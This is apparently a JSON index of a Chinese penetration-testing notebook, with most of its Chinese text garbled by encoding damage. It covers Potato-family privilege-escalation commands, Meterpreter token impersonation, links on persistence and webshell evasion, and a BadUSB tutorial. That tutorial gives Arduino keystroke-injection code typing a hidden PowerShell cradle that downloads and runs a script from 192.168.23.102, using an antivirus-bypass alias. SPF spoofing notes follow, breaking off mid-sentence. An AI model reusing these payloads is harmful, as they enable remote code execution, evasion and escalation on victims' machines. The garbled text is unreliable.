AUTHORITY\\SYSTEMâ€æƒé™ï¼Œå¹¶ä¸”å¯ä»¥åˆ‡æ¢åˆ°ç›®æ ‡ç”¨æˆ·çš„æ¡Œé¢... å†…æ ¸ææƒ æŸ¥æ‰¾è¡¥ä¸æƒ…å†µæ¥é€‰æ‹©CVEæ‰“ åœŸè±†ç³»åˆ— çƒ‚åœŸè±†ï¼ˆRotten Potatoï¼‰ çƒ‚åœŸè±†ä¸é€‚ç”¨äº >= Windows 10 1809 å’Œ Windows Server 2019 çš„ç‰ˆæœ¬ https://github.com/foxglovesec/RottenPotato çƒ‚åœŸè±†é…åˆMSFææƒ ä½¿ç”¨ä»¤ç‰Œçªƒå–è¿›è¡Œææƒ use incognito ï¼ˆè¿›å…¥incognitoæ¨¡å—ï¼‰ é€šè¿‡MSFæ‰§è¡Œçƒ‚åœŸè±† execute -cH -f RottenPotato.exe list_tokens -u ï¼ˆåˆ—å‡ºä»¤ç‰Œï¼‰ impersonate_token \"NT AUTHORITY\\\\SYSTEM\" çƒ‚åœŸè±†NGï¼ˆRotten PotatoNGï¼‰ https://github.com/antonioCoco/JuicyPotatoNG JuicyPotatoNG.exe -t * -p \"c:\\Windows\\System32\\cmd.exe\" -a \"/c whaomi > .\\1.txt\" å¼ºåˆ¶å‚æ•°:-t createprocess call: CreateProcessWithTokenWï¼Œ CreateProcessAsUserï¼Œ åŒæ—¶å°è¯• -p :è¦å¯åŠ¨çš„ç¨‹åºå¯é€‰å‚æ•° -1 : COMæœåŠ¡å™¨ç›‘å¬ç«¯å£(é»˜è®¤ä¸º10247) -a :ä¼ é€’ç»™ç¨‹åºçš„å‘½ä»¤è¡Œå‚æ•°(é»˜è®¤ä¸ºNULL) -c :(é»˜è®¤å€¼{854A20FB-2D44-457D-992F-EF13785D2B51}) -i:äº¤äº’å¼æ§åˆ¶å°(ä»…å¯¹CreateProcessAsUseræœ‰æ•ˆ)é¢å¤–çš„æ¨¡å¼ -b:æš´åŠ›ç ´è§£æ‰€æœ‰clsidã€‚alert:ä»…ç”¨äºæµ‹è¯•ã€‚å¤§çº¦ä¼šäº§ç”Ÿ1000ä¸ªè¿›ç¨‹! -s:å¯»æ‰¾æ²¡æœ‰è¢«Windows Defenderé˜²ç«å¢™è¿‡æ»¤çš„åˆé€‚COMç«¯å£ å¤šæ±åœŸè±†ï¼ˆJuicy Potatoï¼‰ https://github.com/ohpe/juicy-potato http://ohpe.it/juicy-potato/CLSID/ å¤šæ±åœŸè±†é€‚ç”¨äºå¤šæ±åœŸè±†NGï¼ˆJuicy PotatoNGï¼‰ https://github.com/antonioCoco/JuicyPotatoNG JuicyPotatoNG.exe -t * -p \"C:\\windows\\system32\\cmd.exe\" -a \"/c whoami > C:\\JuicyPotatoNG.txt\" RasmanPotato Windows 10(11æœªæµ‹è¯•)ï¼ŒWindows Server 2012 - 2019(2022æœªæµ‹è¯•) magicRasMan v0.1 Provided that the current user has the SeImpersonate privilege, this tool will have an escalation to SYSTEM Arguments: -c Execute the command *CMD* -m Choose The RPC Function [1]VpnProtEngWinRtConnect [2]VpnProtEngGetInterface -i Interact with the new process in the current command prompt (default is non-interactive) DCOMPotato https://github.com/zcgonvh/DCOMPotato LocalPotatoï¼ˆCVE-2023-21746ï¼‰ https://github.com/decoder-it/LocalPotato Copyright Â© Khaz 2024 all right reservedï¼Œpowered by Gitbookè¯¥æ–‡ç« ä¿®è®¢æ—¶é—´ï¼š 2024-01-02 15:54:09 "},"02.åæ¸—é€/WindowsåŸŸæ¸—é€/åæ¸—é€ä¹‹æƒé™ç»´æŒ.html":{"url":"02.åæ¸—é€/WindowsåŸŸæ¸—é€/åæ¸—é€ä¹‹æƒé™ç»´æŒ.html","title":"åæ¸—é€ä¹‹æƒé™ç»´æŒ","keywords":"","body":"æƒé™ç»´æŒçš„ç›®çš„ å½“è·å–åˆ°æœåŠ¡å™¨çš„æ§åˆ¶æƒåï¼Œä¸ºäº†é˜²æ­¢æœåŠ¡å™¨ç®¡ç†å‘˜å‘ç°å’Œä¿®è¡¥æ¼æ´å¯¼è‡´å¯¹æœåŠ¡å™¨æƒé™çš„ä¸¢å¤±ï¼Œæµ‹è¯•äººå‘˜å¾€å¾€éœ€è¦ä¸€äº›æ‰‹æ®µï¼ˆåé—¨ï¼‰æ¥å®ç°å¯¹ç›®æ ‡æœåŠ¡å™¨çš„æŒä¹…åŒ–è®¿é—®ã€‚ æŒä¹…åŒ–è®¿é—®ï¼ˆPersistenceï¼Œæƒé™ç»´æŒï¼‰æŠ€æœ¯å°±æ˜¯åŒ…æ‹¬ä»»ä½•å¯ä»¥è¢«æµ‹è¯•äººå‘˜ç”¨æ¥åœ¨ç³»ç»Ÿé‡å¯ã€æ›´æ”¹ç”¨æˆ·å‡­æ®æˆ–å…¶ä»–å¯èƒ½é€ æˆè®¿é—®ä¸­æ–­çš„æƒ…å†µå‘ç”Ÿæ—¶ä¿æŒå¯¹ç³»ç»Ÿçš„è®¿é—®æŠ€æœ¯ã€‚ å…æ€ Webshell javaå…æ€åˆé›† - è·³è·³ç³– (tttang.com) ä»€ä¹ˆï¼Ÿä½ è¿˜ä¸ä¼šwebshellå…æ€ï¼Ÿï¼ˆä¸€ï¼‰ (qq.com) æµ…è°ˆJspWebshellä¹‹ç¼–ç  - è·³è·³ç³– (tttang.com) æœ¨é©¬ Linuxæƒé™ç»´æŒ https://github.com/RuoJi6/HackerPermKeeper Windowsæƒé™ç»´æŒ Windowsæƒé™ç»´æŒæ€»ç»“ - å…ˆçŸ¥ç¤¾åŒº (aliyun.com) å‚è€ƒæ–‡ç«  æ‹“å±•ï¼šblogs/æŒä¹…æ§åˆ¶/Linux at master Â· aplyc1a/blogs (github.com) 02.Linuxæƒé™ç»´æŒ Â· d4m1ts çŸ¥è¯†åº“ (gm7.org) Copyright Â© Khaz 2024 all right reservedï¼Œpowered by Gitbookè¯¥æ–‡ç« ä¿®è®¢æ—¶é—´ï¼š 2024-12-24 23:04:31 "},"02.åæ¸—é€/ç¤¾ä¼šå·¥ç¨‹å­¦/è¿‘æº/BadUsb.html":{"url":"02.åæ¸—é€/ç¤¾ä¼šå·¥ç¨‹å­¦/è¿‘æº/BadUsb.html","title":"è¿‘æºæ¸—é€ä¹‹BadUSB","keywords":"","body":"åŸç† è¯ç”Ÿ åœ¨2014å¹´çš„BlackHatå¤§ä¼šä¸Šï¼Œä¿¡æ¯å®‰å…¨ä¸“å®¶å±•ç¤ºäº†ä¸€ç§æ–°çš„ç½‘ç»œå®‰å…¨å¨èƒï¼Œè¿™ç§æŠ€æœ¯è¢«ç§°ä¸ºBadUSBï¼Œå®é™…ä¸Šæ˜¯HIDæ”»å‡»ï¼Œè¯¥æ¼æ´ç”±Karsten Nohlå’ŒJakob Lellå…±åŒå‘ç°ã€‚ HID HIDæ˜¯\"Human Interface Device\"çš„ç¼©å†™ï¼Œä¸­æ–‡æ„ä¸º\"äººæœºæ¥å£è®¾å¤‡\"ã€‚HIDæ˜¯ä¸€ç§ç”¨äºè®¡ç®—æœºå’Œå…¶ä»–ç”µå­è®¾å¤‡ä¹‹é—´è¿›è¡Œäº¤äº’çš„æ ‡å‡†åŒ–åè®®å’Œæ¥å£ã€‚HIDåŒ…æ‹¬å¤šç§è¾“å…¥å’Œè¾“å‡ºè®¾å¤‡ï¼Œä¾‹å¦‚é”®ç›˜ã€é¼ æ ‡ã€æ¸¸æˆæ‰‹æŸ„ã€è§¦æ‘¸å±ã€æ‰«æä»ªç­‰ã€‚è¿™äº›è®¾å¤‡é€šè¿‡HIDåè®®ä¸è®¡ç®—æœºé€šä¿¡ï¼Œä½¿ç”¨æˆ·èƒ½å¤Ÿé€šè¿‡è¿™äº›è®¾å¤‡ä¸è®¡ç®—æœºè¿›è¡Œäº¤äº’æ“ä½œã€‚ HIDæ”»å‡» ä¸€èˆ¬æ¥è®²é’ˆå¯¹HIDçš„æ”»å‡»ä¸»è¦é›†ä¸­åœ¨é”®ç›˜é¼ æ ‡ä¸Šï¼Œå› ä¸ºåªè¦æ§åˆ¶äº†ç”¨æˆ·é”®ç›˜ï¼ŒåŸºæœ¬ä¸Šå°±ç­‰äºæ§åˆ¶äº†ç”¨æˆ·çš„ç”µè„‘ã€‚æ”»å‡»è€…ä¼šæŠŠæ”»å‡»éšè—åœ¨ä¸€ä¸ªæ­£å¸¸çš„é¼ æ ‡é”®ç›˜ä¸­ï¼Œå½“ç”¨æˆ·å°†å«æœ‰æ”»å‡»å‘é‡çš„é¼ æ ‡æˆ–é”®ç›˜æ’å…¥ç”µè„‘æ—¶ï¼Œæ¶æ„ä»£ç ä¼šè¢«åŠ è½½å¹¶æ‰§è¡Œã€‚ BadUsbçš„ç»“æ„ BadUsbçš„å†…éƒ¨ç»“æ„å¦‚ä¸‹ å¯ä»¥çœ‹åˆ°ï¼ŒUç›˜å¤§è‡´ç”±ä¸¤éƒ¨åˆ†ç»„æˆï¼Œä¸€éƒ¨åˆ†æ˜¯èŠ¯ç‰‡å¼•å¯¼ç¨‹åºï¼Œä¸€éƒ¨åˆ†æ˜¯é—ªå­˜åŒºåŸŸã€‚ æ§åˆ¶å™¨è´Ÿè´£ä¸PCçš„é€šè®¯å’Œè¯†åˆ«ï¼Œé—ªå­˜ç”¨æ¥åšæ•°æ®å­˜å‚¨ï¼› é—ªå­˜ä¸­æœ‰ä¸€éƒ¨åˆ†åŒºåŸŸç”¨æ¥å­˜æ”¾Uç›˜çš„å›ºä»¶ï¼Œå®ƒçš„ä½œç”¨ç±»ä¼¼äºæ“ä½œç³»ç»Ÿï¼Œæ§åˆ¶è½¯ç¡¬ä»¶äº¤äº’ï¼› BadUsbæ”»å‡» BadUsbçš„æ”»å‡»ä¸HIDæ”»å‡»ç±»ä¼¼ï¼Œä¹Ÿæ˜¯æ’å…¥ç”µè„‘ååŠ è½½å¹¶æ‰§è¡Œæ¶æ„ä»£ç ä»è€Œå®Œæˆæ”»å‡»ã€‚ BadUsbæ’å…¥PCåï¼Œä¼šæ¨¡æ‹Ÿå‡ºä¸€ä¸ªè™šæ‹Ÿé”®ç›˜ï¼ŒåŒæ—¶æ‰§è¡Œæˆ‘ä»¬äº‹å…ˆå†™å…¥åˆ°å›ºä»¶ä¸­çš„ä»£ç æ¥æ•²å‡»ç›¸åº”çš„æŒ‰é”®ï¼Œè¾“å…¥æ”»å‡»ä»£ç ä»è€Œå®Œæˆä¸€äº›æ¶æ„è¡Œä¸ºã€‚ BadUsbä¼˜åŠ¿ åªéœ€è¦ä½¿ç”¨é€šç”¨çš„USBè®¾å¤‡ï¼ˆæ¯”å¦‚Uç›˜ï¼‰å°±å¯ä»¥å®ŒæˆHIDæ”»å‡»ã€‚ æ¶æ„ä»£ç çƒ§å½•åˆ°å›ºä»¶ä¸­ï¼Œè€Œè¿™éƒ¨åˆ†åŒºåŸŸæ˜¯æ€æ¯’è½¯ä»¶æ— æ³•è®¿é—®çš„åŒºåŸŸï¼Œå› æ­¤å¤§éƒ¨åˆ†æ€æ¯’è½¯ä»¶æ˜¯æ ¹æœ¬æ— æ³•åº”å¯¹BadUsbæ”»å‡»çš„ å¸¸è§æ”»å‡»åœºæ™¯ é»‘å®¢æ•…æ„å°†å†™å…¥äº†æ¶æ„ç¨‹åºçš„BadUsbä¸¢åœ¨æŸä¸ªåœºæ‰€é‡Œï¼Œå¦‚æœæœ‰äººå› ä¸ºå¥½å¥‡å¿ƒå°†BadUsbæ’å…¥ç”µè„‘ä¸­ï¼Œé‚£ä¹ˆå…¶ä¸­çš„æ¶æ„ç¨‹åºå°±ä¼šè¿è¡Œï¼Œé»‘å®¢ä»è€Œå¯ä»¥æ§åˆ¶è¿™ä¸ªäººçš„ç”µè„‘ã€‚æ¯”å¦‚æŠ¤ç½‘è¡ŒåŠ¨ï¼Œå¥½å¥‡çš„è“æ–¹äººå‘˜çš„ç”µè„‘è¢«çº¢æ–¹äººå‘˜ä»¥è¿™ç§æ–¹å¼æ§åˆ¶ğŸ˜¨ã€‚ å·¥å…·å‡†å¤‡ æŸå®å¼€å‘æ¿ï¼ˆå…³é”®è¯digisparkï¼‰ Ardunio IDE ä¸‹è½½åœ°å€https://www.arduino.cc/en/software ä¸‹è½½å®Œåæ‰“å¼€Arduino IDE-->æ–‡ä»¶-->é¦–é€‰é¡¹-->é™„åŠ ç®¡ç†å™¨ç½‘å€ï¼šhttp://digistump.com/package_digistump_index.json å·¥å…·-->å¼€å‘æ¿-->å¼€å‘æ¿ç®¡ç†å™¨-->å®‰è£…Digistump AVR è½¯ä»¶åŒ… Digisparké©±åŠ¨ https://github.com/digistump/DigistumpArduino/releases/tag/1.6.7 CobaltStrike å¼€å‘æ¿è¿æ¥ æ¿å­æˆåŠŸè¿æ¥ç”µè„‘åï¼Œå¯ä»¥åœ¨è®¾å¤‡ç®¡ç†å™¨ä¸­çœ‹åˆ° é‡åˆ°ä¸€ä¸ªé—®é¢˜å°±æ˜¯ï¼Œè¿™ç©æ„æ’ä¸Šå»æ²¡æœ‰æ˜¾ç¤ºç«¯å£ï¼ŒArdunioè¿æ¥ä¸äº†ï¼Œè€Œä¸”ä¸€ç›´é—ªçº¢ç¯ğŸ˜¢ã€‚ ç»è¿‡æœç´¢æ‰çŸ¥é“, è¿™å—æ¿å­æ¥ä¸Šç”µæºåªä¿æŒ 5s çš„è¿æ¥, ç„¶åè‡ªåŠ¨è¿è¡Œæ¿å­å†…çš„ç¨‹åºã€‚ æ‰€ä»¥æ­£ç¡®çš„çƒ§å½•æ–¹å¼æ˜¯å…ˆç‚¹å‡»ä¸Šä¼ , ç­‰åˆ°ç»ˆç«¯æç¤ºæ¥å…¥è®¾å¤‡çš„æ—¶å€™, å†æ¥å…¥è®¾å¤‡çƒ§å½•ç¨‹åºã€‚ DigiKeyboard.hä½¿ç”¨ ä¸»è¦åˆ©ç”¨è¯¥åº“æ¥æ¨¡æ‹Ÿé”®ç›˜å’Œé¼ æ ‡è¾“å…¥ åœ¨githubä¸Šæ‰¾åˆ°äº†æ•°å­—æŒ‰é”®è¡¨ é¢„è®¾å¸¸é‡ https://github.com/digistump/DigisparkArduinoIntegration/blob/master/libraries/DigisparkKeyboard/DigiKeyboard.h å¸¸ç”¨å‡½æ•° DigiKeyboard.println(\"text\"); # ç”¨äºå‘æ¨¡æ‹Ÿé”®ç›˜å‘é€æ–‡æœ¬å¹¶åœ¨è®¡ç®—æœºä¸Šè¾“å…¥ä¸€è¡Œå­—ç¬¦å¹¶è‡ªåŠ¨åœ¨æœ«å°¾æ·»åŠ ä¸€ä¸ªå›è½¦ç¬¦ DigiKeyboard.sendKeyStroke(key); # ç”¨äºæ¨¡æ‹ŸæŒ‰ä¸‹å’Œé‡Šæ”¾ä¸€ä¸ªæŒ‡å®šçš„æŒ‰é”® DigiKeyboard.delay(ms) # ç”¨äºåœ¨æ‰§è¡Œåç»­æ“ä½œå‰æš‚åœä¸€æ®µæ—¶é—´ï¼Œå•ä½ä¸ºæ¯«ç§’ å¼¹è®¡ç®—å™¨ Arduinoä»£ç  #include \"DigiKeyboard.h\" String a; String b; String c; void setup() { DigiKeyboard.sendKeyStroke(0); DigiKeyboard.delay(300); DigiKeyboard.sendKeyStroke(57); // å¼€å¯CapsLockå¤§å†™é”å®šé”®ç»•è¿‡ä¸­æ–‡è¾“å…¥æ³•é—®é¢˜(windowså¤§å°å†™ä¸æ•æ„Ÿ) DigiKeyboard.delay(300); DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); // æŒ‰ä¸‹Win+Ré”® DigiKeyboard.delay(800); DigiKeyboard.println(\"calc\"); // æ‰“å¼€è®¡ç®—å™¨ DigiKeyboard.delay(500); DigiKeyboard.sendKeyStroke(57); // å…³é—­CapsLockå¤§å†™é”å®šé”® } void loop() { } PowerShell Bypassç«ç»’ä¸Šçº¿CS å¹²è´§ | æˆ‘çš„powershellå…æ€ä¹‹è·¯ (qq.com) åŸå§‹payload powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://192.168.23.102:8000/one_liner.ps1'))\" Bypass powershell set-alias -name kaspersky -value Invoke-Expression;kaspersky(New-Object Net.WebClient).DownloadString('http://192.168.23.102:8000/one_liner.ps1') è½¬åŒ–ä¸ºArduinoä»£ç  #include \"DigiKeyboard.h\" String a; String b; String c; void setup() { DigiKeyboard.sendKeyStroke(0); DigiKeyboard.delay(300); DigiKeyboard.sendKeyStroke(57);//å¼€å¯CapsLockå¤§å†™é”å®šé”® DigiKeyboard.delay(300); DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);//æŒ‰ä¸‹Win+Ré”® DigiKeyboard.delay(800); DigiKeyboard.println(\"powershell set-alias -name kaspersky -value Invoke-Expression;kaspersky(New-Object Net.WebClient).DownloadString('http://192.168.23.102:8000/one_liner.ps1')\"); DigiKeyboard.delay(500); DigiKeyboard.sendKeyStroke(57);//å…³é—­CapsLockå¤§å†™é”å®šé”® } void loop() { } é˜²å¾¡ ç”±äºæ¶æ„ä»£ç å†…ç½®äºè®¾å¤‡åˆå§‹åŒ–å›ºä»¶ä¸­ï¼Œè€Œä¸æ˜¯é€šè¿‡autorun.infç­‰åª’ä½“è‡ªåŠ¨æ’­æ”¾æ–‡ä»¶è¿›è¡Œæ§åˆ¶ï¼Œå› æ­¤æ— æ³•é€šè¿‡ç¦ç”¨åª’ä½“è‡ªåŠ¨æ’­æ”¾è¿›è¡Œé˜²å¾¡ï¼Œæ€æ¯’è½¯ä»¶æ›´æ˜¯æ— æ³•æ£€æµ‹è®¾å¤‡å›ºä»¶ä¸­çš„æ¶æ„ä»£ç ã€‚ç›®å‰ä¹Ÿæ²¡æœ‰ä»€ä¹ˆæœ‰æ•ˆçš„æ–¹å¼å»é˜²å¾¡BadUSBï¼Œæ¯•ç«Ÿæ— æ³•é˜»æŒ¡ç”µè„‘å»è¯†åˆ«é”®ç›˜é¼ æ ‡æ­¤ç±»çš„HIDè®¾å¤‡ã€‚æ‰€ä»¥è¯´é’ˆå¯¹BadUSBçš„é˜²å¾¡æ–¹æ³•è¿˜æ˜¯åœ¨äºäººå‘˜çš„å®‰å…¨æ„è¯†ä¸Šï¼Œå½“å‘ç°å¯ç–‘çš„Uç›˜æ—¶åˆ‡è«å› å¥½å¥‡æ’å…¥è‡ªå·±çš„ç”µè„‘ã€‚ Copyright Â© Khaz 2024 all right reservedï¼Œpowered by Gitbookè¯¥æ–‡ç« ä¿®è®¢æ—¶é—´ï¼š 2023-10-27 17:05:59 "},"02.åæ¸—é€/ç¤¾ä¼šå·¥ç¨‹å­¦/é’“é±¼/SPFä¼ªé€ .html":{"url":"02.åæ¸—é€/ç¤¾ä¼šå·¥ç¨‹å­¦/é’“é±¼/SPFä¼ªé€ .html","title":"åˆæ¢é‚®ä»¶é’“é±¼","keywords":"","body":"SMTPåè®® é‚®ä»¶å®ç°è¯¦è§£ï¼ˆä¸€ï¼‰------é‚®ä»¶å‘é€çš„åŸºæœ¬è¿‡ç¨‹ä¸æ¦‚å¿µ - YSOcean - åšå®¢å›­ é‚®ä»¶å®ç°è¯¦è§£ï¼ˆäºŒï¼‰------æ‰‹å·¥ä½“éªŒsmtpå’Œpop3åè®® - YSOcean - åšå®¢å›­ SMTPåè®®ä½¿ç”¨çš„ç«¯å£ ç«¯å£ 25 æ˜¯ SMTP æœåŠ¡å™¨ä¹‹é—´è¿æ¥æœ€å¸¸ç”¨çš„ç«¯å£ã€‚å¦‚ä»Šï¼Œç»ˆç«¯ç”¨æˆ·ç½‘ç»œçš„é˜²ç«å¢™é€šå¸¸ä¼šé˜»æ­¢è¿™ä¸ªç«¯å£ï¼Œå› ä¸ºåƒåœ¾é‚®ä»¶å‘é€è€…è¯•å›¾æ»¥ç”¨å®ƒæ¥å‘é€å¤§é‡åƒåœ¾é‚®ä»¶ã€‚ ç«¯å£ 465 æ›¾ç»ä¸“é—¨ç”¨äºå…·å¤‡å®‰å…¨å¥—æ¥å­—å±‚ï¼ˆSSLï¼‰åŠ å¯†çš„ SMTPã€‚ä½† SSL å·²è¢«Transport Layer Securityï¼ˆTLSï¼‰å–ä»£ï¼Œå› è€Œç°ä»£ç”µå­é‚®ä»¶ç³»ç»Ÿä¸å†ä½¿ç”¨è¿™ä¸ªç«¯å£ã€‚è¯¥ç«¯å£ä»…å‡ºç°åœ¨ä¼ ç»Ÿï¼ˆè¿‡æ—¶ï¼‰ç³»ç»Ÿä¸­ã€‚ ç«¯å£ 587 ç°åœ¨æ˜¯ç”µå­é‚®ä»¶æäº¤çš„é»˜è®¤ç«¯å£ã€‚ç»è¿‡è¯¥ç«¯å£çš„ SMTP é€šä¿¡ä½¿ç”¨ TLS åŠ å¯†ã€‚ ç«¯å£ 2525 ä¸ SMTP æ²¡æœ‰æ­£å¼å…³è”ï¼Œä½†æŸäº›ç”µå­é‚®ä»¶æœåŠ¡åœ¨ä¸Šè¿°ç«¯å£è¢«å µå¡çš„æƒ…å†µä¸‹ï¼Œé€šè¿‡è¿™ä¸ªç«¯å£æä¾› SMTP ä¼ è¾“ã€‚ SPFåè®® ç”±æ¥ä¸åŸç† spfå…¨ç§°ä¸ºï¼ˆSender Policy Frameworkï¼‰ï¼Œå³å‘ä»¶äººç­–ç•¥æ¡†æ¶ ç›®å‰æ‰€è¿›è¡Œçš„é‚®ä»¶é€šä¿¡ï¼Œä½¿ç”¨çš„æ˜¯smtpåè®®ï¼ˆSimple Mail Transfer Protocolï¼‰ï¼Œå³ç®€å•é‚®ä»¶ä¼ è¾“åè®®ã€‚ä½†æ˜¯smtpæ˜¯æ²¡æœ‰å¾ˆå¥½çš„å®‰å…¨æªæ–½çš„ï¼Œä¸€ä¸ªç®€å•çš„ä¾‹å­ä¸ºï¼šå‘ä»¶äººçš„é‚®ç®±åœ°å€å¯ä»¥ç”±å‘ä¿¡æ–¹ä»»æ„å£°æ˜ï¼Œå³å‘ä»¶äººé‚®ç®±ä¼ªé€ ã€‚ spfå°±æ˜¯ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œspfçš„åŸç†ï¼š å‡è®¾é‚®ä»¶æœåŠ¡å™¨æ”¶åˆ°äº†ä¸€å°é‚®ä»¶ï¼Œå‘ä»¶äººçš„IPä¸ºï¼š192.6.6.6ï¼Œå¹¶ä¸”å£°ç§°å‘ä»¶äººä¸º email@example.comã€‚ä¸ºäº†ç¡®è®¤å‘ä»¶äººä¸æ˜¯ä¼ªé€ çš„ï¼Œé‚®ä»¶æœåŠ¡å™¨ä¼šæŸ¥è¯¢ example.comçš„spfè®°å½•ã€‚å¦‚æœè¯¥åŸŸçš„spfè®°å½•è®¾ç½®å…è®¸IPä¸º 192.6.6.6 ä¸»æœºå‘é€é‚®ä»¶ï¼Œåˆ™æœåŠ¡å™¨è®¤ä¸ºè¿™å°é‚®ä»¶æ˜¯åˆæ³•çš„ï¼Œå¦åˆ™ï¼Œä¼šé€€ä¿¡ï¼ˆå³æ”¶ä»¶äººæ”¶ä¸åˆ°é‚®ä»¶ï¼‰ï¼Œæˆ–è€…é‚®ä»¶èººåœ¨åƒåœ¾ç®±ã€‚é‚®ç®±ä¼ªé€ å¯ä»¥å£°æ˜ä»–æ¥è‡ªexample.comï¼Œä½†æ˜¯å´æ— æ³•æ“ä½œ example.com çš„ DNSè§£æè®°å½•ï¼Œä¹Ÿæ— æ³•ä¼ªé€ è‡ªå·±çš„IPåœ°å€ï¼Œæ‰€ä»¥SPFè¿˜æ˜¯å¯ä»¥æœ‰æ•ˆé˜²å¾¡é‚®ä»¶ä¼ªé€ çš„ã€‚ é€šä¿—çš„æ¥è®²ï¼ŒA å’Œ B ä¸¤ä¸ªäººå»ºç«‹é€šä¿¡ï¼ŒAå‘Bå‘é€ä¿¡æ¯ï¼ŒB æ£€æŸ¥ Aæ˜¯ä¸æ˜¯åœ¨å¸¸ç”¨åœ°(ç™½åå•)å‘çš„ä¿¡æ¯ï¼Œå¦‚æœä¸æ˜¯ï¼Œåˆ™æ‹’æ”¶ä¿¡æ¯ã€‚ è¯­æ³• ä¸€æ¡ SPF è®°å½•å®šä¹‰äº†ä¸€ä¸ªæˆ–è€…å¤šä¸ª mechanismï¼Œè€Œ mechanism åˆ™å®šä¹‰äº†å“ªäº› IP æ˜¯å…è®¸çš„ï¼Œå“ªäº› IP æ˜¯æ‹’ç»çš„ã€‚ è¿™äº› mechanism åŒ…æ‹¬ä»¥ä¸‹å‡ ç±»ï¼š all | ip4 | ip6 | a | mx | ptr | exists | include æ¯ä¸ª mechanism å¯ä»¥æœ‰å››ç§å‰ç¼€ï¼š \"+\" Passï¼ˆé€šè¿‡ï¼‰ \"-\" Failï¼ˆæ‹’ç»ï¼‰ \"~\" Soft Failï¼ˆè½¯æ‹’ç»ï¼‰ \"?\" Neutralï¼ˆä¸­ç«‹ï¼‰ æµ‹è¯•æ—¶ï¼Œå°†ä»å‰å¾€åä¾æ¬¡æµ‹è¯•æ¯ä¸ª mechanismã€‚å¦‚æœä¸€ä¸ª mechanism åŒ…å«äº†è¦æŸ¥è¯¢çš„ IP åœ°å€ï¼ˆç§°ä¸ºå‘½ä¸­ï¼‰ï¼Œåˆ™æµ‹è¯•ç»“æœç”±ç›¸åº” mechanism çš„å‰ç¼€å†³å®šã€‚é»˜è®¤çš„å‰ç¼€ä¸º+ã€‚å¦‚æœæµ‹è¯•å®Œæ‰€æœ‰çš„ mechanisms ä¹Ÿæ²¡æœ‰å‘½ä¸­ï¼Œåˆ™ç»“æœä¸º Neutralã€‚ é™¤äº†ä»¥ä¸Šå››ç§æƒ…å†µï¼Œè¿˜æœ‰ Noneï¼ˆæ— ç»“æœï¼‰ã€PermErrorï¼ˆæ°¸ä¹…é”™è¯¯ï¼‰å’Œ TempErrorï¼ˆä¸´æ—¶é”™è¯¯ï¼‰ä¸‰ç§å…¶ä»–æƒ…å†µã€‚å¯¹äºè¿™äº›æƒ…å†µçš„è§£é‡Šå’ŒæœåŠ¡å™¨é€šå¸¸çš„å¤„ç†åŠæ³•å¦‚ä¸‹ï¼š ç»“æœ å«ä¹‰ æœåŠ¡å™¨å¤„ç†åŠæ³• Pass å‘ä»¶ IP æ˜¯åˆæ³•çš„ æ¥å—æ¥ä¿¡ Fail å‘ä»¶ IP æ˜¯éæ³•çš„ é€€ä¿¡ Soft Fail å‘ä»¶ IP éæ³•ï¼Œä½†æ˜¯ä¸é‡‡å–å¼ºç¡¬æªæ–½ æ¥å—æ¥ä¿¡ï¼Œä½†æ˜¯åšæ ‡è®° Neutral SPF è®°å½•ä¸­æ²¡æœ‰å…³äºå‘ä»¶ IP æ˜¯å¦åˆæ³•çš„ä¿¡æ¯ æ¥å—æ¥ä¿¡ None æœåŠ¡å™¨æ²¡æœ‰è®¾å®š SPF è®°å½• æ¥å—æ¥ä¿¡ PermError å‘ç”Ÿäº†ä¸¥é‡é”™è¯¯ï¼ˆä¾‹å¦‚ SPF è®°å½•è¯­æ³•é”™è¯¯ï¼‰ æ²¡æœ‰è§„å®š TempError å‘ç”Ÿäº†ä¸´æ—¶é”™è¯¯ï¼ˆä¾‹å¦‚ DNS æŸ¥è¯¢å¤±è´¥ï¼‰ æ¥å—æˆ–æ‹’ç» æ³¨æ„ï¼Œä¸Šé¢æ‰€è¯´çš„ã€ŒæœåŠ¡å™¨å¤„ç†åŠæ³•ã€ä»…ä»…æ˜¯ SPF æ ‡å‡†åšå‡ºçš„å»ºè®®ï¼Œå¹¶éæ‰€æœ‰çš„é‚®ä»¶æœåŠ¡å™¨éƒ½ä¸¥æ ¼éµå¾ªè¿™å¥—è§„å®šã€‚ Mechanisms ä¸‹é¢ä»‹ç»ä¸Šé¢æåˆ°çš„ mechanismï¼š all è¡¨ç¤ºæ‰€æœ‰ IPï¼Œè‚¯å®šä¼šå‘½ä¸­ã€‚å› æ­¤é€šå¸¸æŠŠå®ƒæ”¾åœ¨ SPF è®°å½•çš„ç»“å°¾ï¼Œè¡¨ç¤ºå¤„ç†å‰©ä¸‹çš„æ‰€æœ‰æƒ…å†µã€‚ä¾‹å¦‚ï¼š \"v=spf1 -all\" æ‹’ç»æ‰€æœ‰ï¼ˆè¡¨ç¤ºè¿™ä¸ªåŸŸåä¸ä¼šå‘å‡ºé‚®ä»¶ï¼‰ \"v=spf1 +all\" æ¥å—æ‰€æœ‰ï¼ˆåŸŸåæ‰€æœ‰è€…è®¤ä¸º SPF æ˜¯æ²¡æœ‰ç”¨çš„ï¼Œæˆ–è€…æ ¹æœ¬ä¸åœ¨ä¹å®ƒï¼‰ ip4 æ ¼å¼ä¸ºip4:æˆ–è€…ip4:/ï¼ŒæŒ‡å®šä¸€ä¸ª IPv4 åœ°å€æˆ–è€…åœ°å€æ®µã€‚å¦‚æœprefix-lengthæ²¡æœ‰ç»™å‡ºï¼Œåˆ™é»˜è®¤ä¸º/32ã€‚ä¾‹å¦‚ï¼š \"v=spf1 ip4:192.168.0.1/16 -all\" åªå…è®¸åœ¨ 192.168.0.1 ~ 192.168.255.255 èŒƒå›´å†…çš„ IP ip6 æ ¼å¼å’Œip4çš„å¾ˆç±»ä¼¼ï¼Œé»˜è®¤çš„prefix-lengthæ˜¯/128ã€‚ä¾‹å¦‚ï¼š \"v=spf1 ip6:1080::8:800:200C:417A/96 -all\" åªå…è®¸åœ¨ 1080::8:800:0000:0000 ~ 1080::8:800:FFFF:FFFF èŒƒå›´å†…çš„ IP a å’Œ mx è¿™ä¿©çš„æ ¼å¼æ˜¯ç›¸åŒçš„ï¼Œä»¥aä¸ºä¾‹ï¼Œæ ¼å¼ä¸ºä»¥ä¸‹å››ç§ä¹‹ä¸€ï¼š a a/ a: a:/ ä¼šå‘½ä¸­ç›¸åº”åŸŸåçš„ a è®°å½•ï¼ˆæˆ– mx 